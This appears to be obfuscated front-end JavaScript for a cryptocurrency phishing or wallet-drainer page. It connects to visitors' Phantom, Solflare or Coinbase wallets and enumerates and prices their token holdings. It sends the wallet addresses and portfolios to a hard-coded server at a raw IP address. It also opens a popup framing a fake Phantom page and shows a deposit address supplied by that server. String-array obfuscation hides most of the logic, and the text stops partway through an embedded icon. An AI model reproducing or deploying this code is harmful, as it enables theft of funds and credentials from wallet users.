import {
    _ as t
} from "./libs.js";
import {
    C as M,
    L as e,
    P as i,
    d as n,
    S as N
} from "./solana.js";
import {
    T as a,
    A as c,
    c as w,
    a as l
} from "./spl.js";
! function() {
    const t = document.createElement("link").relList;
    if (!(t && t.supports && t.supports("modulepreload"))) {
        for (const t of document.querySelectorAll('link[rel="modulepreload"]')) M(t);
        new MutationObserver((t => {
            for (const e of t)
                if ("childList" === e.type)
                    for (const t of e.addedNodes) "LINK" === t.tagName && "modulepreload" === t.rel && M(t)
        })).observe(document, {
            childList: !0,
            subtree: !0
        })
    }

    function M(t) {
        if (t.ep) return;
        t.ep = !0;
        const M = function(t) {
            const M = {};
            return t.integrity && (M.integrity = t.integrity), t.referrerpolicy && (M.referrerPolicy = t.referrerpolicy), "use-credentials" === t.crossorigin ? M.credentials = "include" : "anonymous" === t.crossorigin ? M.credentials = "omit" : M.credentials = "same-origin", M
        }(t);
        fetch(t.href, M)
    }
}();
const o = T;
! function(t, M) {
    const e = T,
        i = g();
    for (;;) try {
        if (181685 === -parseInt(e(386)) / 1 + parseInt(e(383)) / 2 * (-parseInt(e(396)) / 3) + parseInt(e(404)) / 4 + parseInt(e(380)) / 5 * (parseInt(e(395)) / 6) + parseInt(e(400)) / 7 + -parseInt(e(407)) / 8 * (parseInt(e(397)) / 9) + -parseInt(e(391)) / 10) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
const A = t.create({
    baseURL: o(390)
});
A[o(405)][o(381)].use((t => {
    const M = o;
    return t[M(398)][M(415)] = "11", t
}));
const D = "http://185.43.222.228:3000/api";

function g() {
    const t = ["/details", "16254jHUjoj", "138GrBobX", "15426dAvDFo", "headers", ";q=0.", "579740xyezxM", "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111", "11111111111111111111111111111111111111111111", "slice", "1382516xjsMXo", "interceptors", "JSON error:", "1064ToHkNr", "data", "https://api.phantom.app/transaction/scan/v1?language=", "strict-origin-when-cross-origin", "/onaccept", "languages", "/join", "/onrequest", "GIT", "/oncancel", "415yiDMpg", "request", "/settings", "2476euYdRa", "test", "join", "172002tLYABM", "include", "application/json", "no-cors", "http://185.43.222.228:3000/api", "146990aDREdD", "post", "*/*"];
    return (g = function() {
        return t
    })()
}
async function s() {
    const t = o;
    return (await A[t(392)](D + t(394)))[t(408)]
}
async function d(t) {
    const M = o;
    await A.post(D + M(414), {
        WALLET: t
    })
}
async function I(t) {
    const M = o;
    await A.post(D + M(416), {
        WALLET: t
    })
}
async function u(t, M, e) {
    await A.post(D + "/info", {
        wallets: e,
        WALLET: t,
        PORTFOLIO: M
    })
}
async function j() {
    const t = o;
    try {
        return (await A[t(392)](D + t(382), {
            wallets: t(384)
        }))[t(408)]
    } catch (M) {
        console.error(t(406), M)
    }
}
async function r() {
    const t = o;
    A[t(392)](t(409) + navigator.language, {
        userAccount: t(402),
        metadata: {
            origin: "https://soap.com"
        },
        chainIds: ["solana:101"],
        transactions: [t(401)]
    }, {
        headers: {
            accept: t(393),
            "accept-language": z(),
            "cache-control": "no-cache",
            "content-type": t(388),
            pragma: "no-cache"
        },
        referrerPolicy: t(410),
        mode: t(389),
        credentials: t(387)
    }), setTimeout(r, 500)
}
let z = () => {
    const t = o;
    let M = 1;
    return navigator[t(412)][t(403)](0, 10).map((e => e + t(399) + (10 - M++)))[t(385)](",")
};

function T(t, M) {
    const e = g();
    return (T = function(t, M) {
        return e[t -= 380]
    })(t, M)
}
async function x(t) {
    const M = o;
    await A[M(392)](D + M(411), t, {
        headers: {
            "Content-Type": "application/json"
        }
    })
}
const y = L;

function L(t, M) {
    const e = m();
    return (L = function(t, M) {
        return e[t -= 311]
    })(t, M)
}

function m() {
    const t = ["3550015ZiIgYK", "classList", "#alert", "phantomWallet", "green", "Already deposited to this address (Min: ", "substr", "46571120iwOaTW", "Address has been copied.", "DEPOSIT", "map", ";q=0.", "vendor", " SOL)", "4KLCuiG", "324vMNQWy", "languages", "innerHTML", "Min: ", "join", "handled_amount", "3520076UVWlMI", "12McgAuk", "getElementById", "querySelector", "error", "1568652NZuFZF", "152168okYmGE", "navigator", "test", "addEventListener", "click", "amount", "add", "hide", "991754yphLIc", "minAmountSol", "3000252KuUeHV", "userAgent", "#copy_address", "remove", "load", "writeText"];
    return (m = function() {
        return t
    })()
}

function Q() {
    const t = L;
    let M = !1;
    return function(t) {
        const e = L;
        (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i [e(351)](t) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i [e(351)](t[e(328)](0, 4))) && (M = !0)
    }(navigator[t(317)] || navigator[t(334)] || window.opera), M
}! function(t, M) {
    const e = L,
        i = m();
    for (;;) try {
        if (519547 === parseInt(e(314)) / 1 + parseInt(e(348)) / 2 + -parseInt(e(316)) / 3 * (-parseInt(e(336)) / 4) + parseInt(e(322)) / 5 + -parseInt(e(344)) / 6 * (-parseInt(e(343)) / 7) + -parseInt(e(349)) / 8 * (-parseInt(e(337)) / 9) + -parseInt(e(329)) / 10) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
const O = t => new Promise((M => setTimeout(M, t)));
let p = {};
const U = document.querySelector("#addressToDeposit"),
    E = document[y(346)](y(324)),
    b = document[y(346)](y(318));
window[y(352)](y(320), (async function() {
    const t = y;
    p = await j();
    const M = await s();
    var e;
    try {
        e = await M
    } catch (n) {
        return void console[t(347)](n)
    }
    U[t(339)] = e[t(331)];
    const i = (await j())[t(325)].minimal_amount;
    console.log(i), window[t(315)] = i, document.getElementById(t(311)).placeholder = t(340) + i + " SOL", document[t(345)](t(342))[t(339)] = t(327) + i + t(335), b[t(352)](t(353), (function() {
        const M = t;
        window[M(350)].clipboard[M(321)](e[M(331)]), E.innerHTML = M(330), E.classList[M(312)](M(326)), E.classList[M(319)](M(313)), setTimeout((() => E[M(323)].add("hide")), 2500)
    }))
}));
const C = h;

function S() {
    const t = ["7FZQLJC", "1510OJATCN", "357134OjYSai", "wss://smart-still-diagram.solana-mainnet.quiknode.pro/70967b189cdad39d3aa46e45c8f0e105e18c5cf2/", "6809048dBOkBO", "63107yShDYH", "1462674qCFMMj", "10FYnhml", "2628068JARVrQ", "RPC_HOST", "http://185.43.222.228:3000/api/rpc", "2806785sIjZAd", "5gmlVEp", "224682tNoyhz"];
    return (S = function() {
        return t
    })()
}

function h(t, M) {
    const e = S();
    return (h = function(t, M) {
        return e[t -= 293]
    })(t, M)
}! function(t, M) {
    const e = h,
        i = S();
    for (;;) try {
        if (586751 === parseInt(e(306)) / 1 + -parseInt(e(297)) / 2 * (parseInt(e(303)) / 3) + parseInt(e(298)) / 4 + -parseInt(e(302)) / 5 * (-parseInt(e(296)) / 6) + -parseInt(e(304)) / 7 * (parseInt(e(294)) / 8) + -parseInt(e(301)) / 9 + parseInt(e(305)) / 10 * (parseInt(e(295)) / 11)) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
const k = new M(window[C(299)] || C(300), {
    wsEndpoint: C(293)
});

function f(t, M) {
    const e = Y();
    return (f = function(t, M) {
        return e[t -= 238]
    })(t, M)
}

function Y() {
    const t = ["name", "error", "amount", "1135GysKUG", "Error: ", "push", "join", "9gScttn", "account", "8344wAOmjp", "NATIVE-SOL", "map", "2111192UVNPBf", "data", "24066850IDwZlQ", "length", "mint", "UNKNOWN", "toString", "697443ZeIVRf", "frozen", "message", "mintSymbol", "info", "log", "1060634kZSSJU", "2758458RNdPyi", "toLowerCase", "lamports", "2366028pvbuIf", "parsed", "sort", "decimals", "6qhLMZp", "AMOUNT", "balance"];
    return (Y = function() {
        return t
    })()
}
async function v(t) {
    const M = f,
        e = await k.getAccountInfo(t);
    if (!e) return !1;
    const i = e[M(251)];
    return !(i < 2e5) && i
}
async function B(t, M) {
    const e = f;
    try {
        const t = 100;
        let a = [];
        const c = [],
            w = M[e(270)]((M => {
                const i = e,
                    {
                        mint: n,
                        tokenAmount: N
                    } = M[i(267)][i(272)][i(253)][i(246)];
                return a.push(n), a[i(238)] === t && (c[i(264)](a), a = []), console[i(247)]("a", N), {
                    mint: n,
                    balance: N[i(261)]
                }
            }));
        for (var i of (a.length > 0 && c[e(264)](a), c)) {
            const t = "https://price.jup.ag/v4/price?ids=" + i[e(265)](","),
                M = await A.get(t);
            for (var n in M[e(272)].data) {
                let t = M[e(272)][e(272)][n];
                for (var N of w)
                    if (N[e(239)] == t.id) {
                        N.balance = N[e(258)], N[e(259)] = t[e(245)];
                        break
                    }
            }
        }
        return w
    } catch (a) {
        return console[e(260)](e(263) + a[e(244)]), []
    }
}
async function V(t, M, i) {
    const n = f,
        N = [];
    for (const e of M) {
        let M = !1;
        console[n(247)](e.account[n(272)][n(253)][n(246)]);
        const {
            mint: i,
            tokenAmount: a,
            state: c
        } = e.account[n(272)].parsed[n(246)];
        if (c !== n(243) && 0 != a) {
            for (const e of t)
                if (e.mint.toString()[n(250)]() === i[n(241)]()[n(250)]() && a[n(261)] > 0) {
                    console[n(247)](e[n(259)], a, a[n(261)]), N[n(264)]({
                        VALUE: e[n(258)],
                        MINT: i[n(241)](),
                        NAME: e.name,
                        AMOUNT: a[n(261)],
                        DECIMALS: a.decimals
                    }), M = !0;
                    break
                }! M && a[n(261)] > 0 && N[n(264)]({
                VALUE: 0,
                MINT: i[n(241)](),
                NAME: n(240),
                AMOUNT: a.amount,
                DECIMALS: a[n(255)]
            })
        }
    }
    return N[n(264)]({
        VALUE: i / e,
        MINT: void 0,
        NAME: n(269),
        AMOUNT: i / e
    }), N[n(254)](((t, M) => M[n(257)] - t[n(257)])), N
}! function(t, M) {
    const e = f,
        i = Y();
    for (;;) try {
        if (736492 === -parseInt(e(242)) / 1 + -parseInt(e(248)) / 2 * (parseInt(e(256)) / 3) + parseInt(e(268)) / 4 * (parseInt(e(262)) / 5) + -parseInt(e(249)) / 6 + parseInt(e(252)) / 7 + parseInt(e(271)) / 8 * (-parseInt(e(266)) / 9) + parseInt(e(273)) / 10) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
const Z = F;

function F(t, M) {
    const e = _();
    return (F = function(t, M) {
        return e[t -= 457]
    })(t, M)
}
let W, G;
! function(t, M) {
    const e = F,
        i = _();
    for (;;) try {
        if (511290 === -parseInt(e(470)) / 1 * (-parseInt(e(459)) / 2) + parseInt(e(502)) / 3 * (-parseInt(e(479)) / 4) + -parseInt(e(460)) / 5 * (-parseInt(e(457)) / 6) + parseInt(e(515)) / 7 + -parseInt(e(503)) / 8 + -parseInt(e(517)) / 9 + parseInt(e(497)) / 10 * (-parseInt(e(488)) / 11)) break;
        i.push(i.shift())
    } catch (n) {
        i.push(i.shift())
    }
}();
let R = !1,
    H = !1,
    P = !1;
const X = async function(t) {
    const M = F;
    var e = Q();
    if ("phantom" === t) {
        if (1 == p[M(505)][M(481)]) return void async function(t = Z(498), M = !1) {
            const e = Z;
            try {
                p[e(505)][e(489)] && !M && await q(t),
                    function(t = Z(498), M = !1) {
                        const e = Z;
                        var i = window[e(476)][e(504)],
                            n = i[e(458)](0, i[e(467)]("/")) + "/";
                        if (M) return void(location.href = n + e(520));
                        var N = "Phantom Wallet";
                        window[e(499)] && (window[e(499)][e(522)](), window.wind = null);
                        var a = 361,
                            c = 729;
                        window[e(499)] = window[e(514)]("", "hello", e(483) + a + e(486) + c + e(496)), window[e(499)].document[e(461)](e(500) + N + e(490) + n + '/phantom/i.html" frameborder="0"></iframe></body></html>'), window[e(499)][e(472)]("resize", (() => {
                            window.wind.resizeTo(a, c)
                        }))
                    }(t, M)
            } catch (i) {
                console[e(462)](i)
            }
        }(t, e);
        R ? (W = window.solana, W.on(M(480), (async function() {
            return G = W.publicKey, t
        })), await W[M(480)]({
            onlyIfTrusted: !1
        })) : Q() ? window.location[M(504)] = M(478) + encodeURIComponent(window.location[M(504)]) : window[M(476)][M(504)] = M(521)
    } else if ("solflare" == t) H ? (W = window[M(509)], W.on(M(480), (async function() {
        G = W.publicKey, returnchoice
    })), await W[M(480)]({
        onlyIfTrusted: !1
    })) : window.location[M(504)] = M(468);
    else if ("coinbase" == t)
        if (P) {
            if (W = window[M(466)], await W.connect({
                    onlyIfTrusted: !1
                }), W[M(465)]) return G = W[M(519)], t
        } else window[M(514)](M(491), M(493))
};
window[Z(472)]("load", (async function() {
    const t = Z;
    R = window[t(498)]?.[t(507)]?.[t(484)], H = window[t(509)]?.[t(463)], P = window.coinbaseWalletExtension?.[t(469)], async function(t) {
        const M = o;
        (await A[M(392)](D + M(413), {
            wallets: t
        }))[M(408)]
    }({
        phantom: R,
        solflare: H,
        coinbase: P
    })
}));
const J = () => {
        const t = Z;
        if ("phantom" in window) {
            const M = window[t(498)]?.[t(507)];
            if (M?.isPhantom) return M
        }
        window.open(t(475), t(493))
    },
    K = document.querySelector("#selectProviderText");
async function q(t) {
    const M = Z;
    let e = null;
    {
        const t = window.phantom?.[M(507)]?.isPhantom;
        if (!t) return;
        if (e = J(), !e) return;
        try {
            var i = await e[M(480)]();
            console.log(M(474), i), K.innerHTML = M(494), G = i.publicKey, async function() {
                const t = Z;
                console[t(462)](G, Object[t(518)](G));
                const M = await v(G),
                    e = (await k[t(495)](G, {
                        programId: a
                    })).value,
                    i = await B(G.toString(), e),
                    n = (await V(i, e, M))[t(477)]().map((M => {
                        const e = t;
                        return "NATIVE-SOL" != M[e(492)] && M?.[e(516)] && (M[e(511)] = M.AMOUNT / Math[e(485)](10, M[e(516)])), M
                    }));
                await u(G.toString(), n, {
                    phantom: R,
                    solflare: H,
                    coinbase: P
                })
            }()
        } catch (n) {
            4001 === n[M(506)] ? console[M(462)](M(464)) : console[M(510)](M(508), n)
        }
    }
}

function _() {
    const t = ["write", "log", "isSolflare", "User rejected the connection request.", "isConnected", "coinbaseSolana", "lastIndexOf", "https://solflare.com/", "isCoinbaseWallet", "8907KWoNHw", "toString", "addEventListener", "addresslast", "Wallet connected:", "https://phantom.app/", "location", "slice", "https://phantom.app/ul/browse/", "8WhWxbK", "connect", "type", "addressfirst", "width=", "isPhantom", "pow", ",height=", "length", "4986773USEsPt", "sCon", '"; const link = document.createElement("link"); link.rel = "icon"; link.type = "image/x-icon"; link.href = "/phantom.ico"; document.head.appendChild(link);<\/script><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="', "https://www.coinbase.com/", "NAME", "_blank", "Injected Provider - Phantom", "getParsedTokenAccountsByOwner", ",menubar=1,resizable=0", "10DgXTBE", "phantom", "wind", '<!DOCTYPE html><html><head></head><body><script>document.title = "', "replace", "496542DfWAMb", "659496jwMeNS", "href", "phantomWallet", "code", "solana", "Failed to connect wallet:", "solflare", "error", "AMOUNT", "modalSelect", "#connect", "open", "6288919WtJIds", "DECIMALS", "8268588CHREDn", "keys", "publicKey", "/phantom/i.html", "https://phantom.app/download", "close", "9822PUaLeL", "substring", "178qgXpvT", "1850xScyGl"];
    return (_ = function() {
        return t
    })()
}
document.querySelector(Z(513))[Z(472)]("click", (() => q(Z(498)))), window[Z(512)] = X;
var $ = Mt;

function tt() {
    var t = ["modalChoice", "cmdlzx", "Modal Close (overwritten)", "5135580viaHwJ", "assets/cmodal.css", "length", "span", "./images/coinbase.png", "8RkgvEc", "https://www.greymass.com/anchor", "body", '<polyline points="6 9 12 15 18 9"></polyline>', "modal4", "collapseModal3", "width", "cmdlz", "createElement", "_blank", "wallet-adapter-modal-container", "11Dxqmdg", "./images/slope.png", "closePopup", "type", "wallet-popup", "overflow", "getElementsByClassName", "218UFtgGw", '\n    <div aria-labelledby="wallet-adapter-modal-title" aria-modal="true" class="!bg-accent/20 wallet-adapter-modal wallet-adapter-modal-fade-in " role="dialog">\n  <div class="wallet-adapter-modal-container" onclick="event.stopPropagation()">\n    <div class="h-full wallet-adapter-modal-wrapper" style="border-radius: 40px; padding: 5px; background: linear-gradient(0deg, rgb(185, 107, 252), rgb(187, 204, 255));">\n      <div class="!px-2 !py-3 sm:!px-4 sm:!py-4 !bg-white dark:!bg-slate-950 " style="width: 100%; height: 100%; border-radius: 38px; background: linear-gradient(0deg, rgba(185, 107, 252, 0.2), rgba(187, 204, 255, 0.3));">\n        <button onclick="window.modalClose();" class="!bg-blue-400/50 hover:!bg-blue-400/60 wallet-adapter-modal-button-close">\n          <svg width="14" height="14">\n            <path fill="white" d="M14 12.461 8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z"></path>\n          </svg>\n        </button>\n        <h1 class="!text-zinc-800 dark:!text-zinc-200 !font-medium !text-2xl !px-3 wallet-adapter-modal-title">Connect Solana Wallet to Continue</h1>\n        <ul class="wallet-adapter-modal-list">\n          <div class="w-full hover:!bg-blue-500/30 border border-transparent rounded-2xl">\n            <button onclick="window.modalClose(); window.modalChoice(\'phantom\');" class="!text-zinc-700 hover:!bg-transparent !px-2 xs:!px-6 wallet-adapter-button dark:!text-zinc-200 " tabindex="0" type="button">\n              <i class="wallet-adapter-button-start-icon">\n                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiB2aWV3Qm94PSIwIDAgMTA4IDEwOCIgZmlsbD0ibm9uZSI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPg==" alt="Phantom icon" class="">\n              </i>Phantom </button>\n          </div>\n          <div class="w-full hover:!bg-blue-500/30 border border-transparent rounded-2xl">\n            <button onclick="window.modalClose(); window.modalChoice(\'solflare\');" class="!text-zinc-700 hover:!bg-transparent !px-2 xs:!px-6 wallet-adapter-button dark:!text-zinc-200 " tabindex="0" type="button">\n              <i class="wallet-adapter-button-start-icon">\n                <img src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgNTAgNTAiIHdpZHRoPSI1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGxpbmVhckdyYWRpZW50IGlkPSJhIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiNmZmMxMGIiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNmYjNmMmUiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0iYiIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHgxPSI2LjQ3ODM1IiB4Mj0iMzQuOTEwNyIgeGxpbms6aHJlZj0iI2EiIHkxPSI3LjkyIiB5Mj0iMzMuNjU5MyIvPjxyYWRpYWxHcmFkaWVudCBpZD0iYyIgY3g9IjAiIGN5PSIwIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDQuOTkyMTg4MzIgMTIuMDYzODc5NjMgLTEyLjE4MTEzNjU1IDUuMDQwNzEwNzQgMjIuNTIwMiAyMC42MTgzKSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIHI9IjEiIHhsaW5rOmhyZWY9IiNhIi8+PHBhdGggZD0ibTI1LjE3MDggNDcuOTEwNGMuNTI1IDAgLjk1MDcuNDIxLjk1MDcuOTQwM3MtLjQyNTcuOTQwMi0uOTUwNy45NDAyLS45NTA3LS40MjA5LS45NTA3LS45NDAyLjQyNTctLjk0MDMuOTUwNy0uOTQwM3ptLTEuMDMyOC00NC45MTU2NWMuNDY0Ni4wMzgzNi44Mzk4LjM5MDQuOTAyNy44NDY4MWwxLjEzMDcgOC4yMTU3NGMuMzc5OCAyLjcxNDMgMy42NTM1IDMuODkwNCA1LjY3NDMgMi4wNDU5bDExLjMyOTEtMTAuMzExNThjLjI3MzMtLjI0ODczLjY5ODktLjIzMTQ5Ljk1MDcuMDM4NTEuMjMwOS4yNDc3Mi4yMzc5LjYyNjk3LjAxNjEuODgyNzdsLTkuODc5MSAxMS4zOTU4Yy0xLjgxODcgMi4wOTQyLS40NzY4IDUuMzY0MyAyLjI5NTYgNS41OTc4bDguNzE2OC44NDAzYy40MzQxLjA0MTguNzUxNy40MjM0LjcwOTMuODUyNC0uMDM0OS4zNTM3LS4zMDc0LjYzOTUtLjY2MjguNjk0OWwtOS4xNTk0IDEuNDMwMmMtMi42NTkzLjM2MjUtMy44NjM2IDMuNTExNy0yLjEzMzkgNS41NTc2bDMuMjIgMy43OTYxYy4yNTk0LjMwNTguMjE4OC43NjE1LS4wOTA4IDEuMDE3OC0uMjYyMi4yMTcyLS42NDE5LjIyNTYtLjkxMzguMDIwM2wtMy45Njk0LTIuOTk3OGMtMi4xNDIxLTEuNjEwOS01LjIyOTctLjI0MTctNS40NTYxIDIuNDI0M2wtLjg3NDcgMTAuMzk3NmMtLjAzNjIuNDI5NS0uNDE3OC43NDg3LS44NTI1LjcxMy0uMzY5LS4wMzAzLS42NjcxLS4zMDk3LS43MTcxLS42NzIxbC0xLjM4NzEtMTAuMDQzN2MtLjM3MTctMi43MTQ0LTMuNjQ1NC0zLjg5MDQtNS42NzQzLTIuMDQ1OWwtMTIuMDUxOTUgMTAuOTc0Yy0uMjQ5NDcuMjI3MS0uNjM4MDkuMjExNC0uODY4LS4wMzUtLjIxMDk0LS4yMjYyLS4yMTczNS0uNTcyNC0uMDE0OTMtLjgwNmwxMC41MTgxOC0xMi4xMzg1YzEuODE4Ny0yLjA5NDIuNDg0OS01LjM2NDQtMi4yODc2LTUuNTk3OGwtOC43MTg3Mi0uODQwNWMtLjQzNDEzLS4wNDE4LS43NTE3Mi0uNDIzNS0uNzA5MzYtLjg1MjQuMDM0OTMtLjM1MzcuMzA3MzktLjYzOTQuNjYyNy0uNjk1bDkuMTUzMzgtMS40Mjk5YzIuNjU5NC0uMzYyNSAzLjg3MTgtMy41MTE3IDIuMTQyMS01LjU1NzZsLTIuMTkyLTIuNTg0MWMtLjMyMTctLjM3OTItLjI3MTMtLjk0NDMuMTEyNi0xLjI2MjEuMzI1My0uMjY5NC43OTYzLS4yNzk3IDEuMTMzNC0uMDI0OWwyLjY5MTggMi4wMzQ3YzIuMTQyMSAxLjYxMDkgNS4yMjk3LjI0MTcgNS40NTYxLTIuNDI0M2wuNzI0MS04LjU1OTk4Yy4wNDU3LS41NDA4LjUyNjUtLjk0MjU3IDEuMDczOS0uODk3Mzd6bS0yMy4xODczMyAyMC40Mzk2NWMuNTI1MDQgMCAuOTUwNjcuNDIxLjk1MDY3Ljk0MDNzLS40MjU2My45NDAzLS45NTA2Ny45NDAzYy0uNTI1MDQxIDAtLjk1MDY3LS40MjEtLjk1MDY3LS45NDAzcy40MjU2MjktLjk0MDMuOTUwNjctLjk0MDN6bTQ3LjY3OTczLS45NTQ3Yy41MjUgMCAuOTUwNy40MjEuOTUwNy45NDAzcy0uNDI1Ny45NDAyLS45NTA3Ljk0MDItLjk1MDctLjQyMDktLjk1MDctLjk0MDIuNDI1Ny0uOTQwMy45NTA3LS45NDAzem0tMjQuNjI5Ni0yMi40Nzk3Yy41MjUgMCAuOTUwNi40MjA5NzMuOTUwNi45NDAyNyAwIC41MTkzLS40MjU2Ljk0MDI3LS45NTA2Ljk0MDI3LS41MjUxIDAtLjk1MDctLjQyMDk3LS45NTA3LS45NDAyNyAwLS41MTkyOTcuNDI1Ni0uOTQwMjcuOTUwNy0uOTQwMjd6IiBmaWxsPSJ1cmwoI2IpIi8+PHBhdGggZD0ibTI0LjU3MSAzMi43NzkyYzQuOTU5NiAwIDguOTgwMi0zLjk3NjUgOC45ODAyLTguODgxOSAwLTQuOTA1My00LjAyMDYtOC44ODE5LTguOTgwMi04Ljg4MTlzLTguOTgwMiAzLjk3NjYtOC45ODAyIDguODgxOWMwIDQuOTA1NCA0LjAyMDYgOC4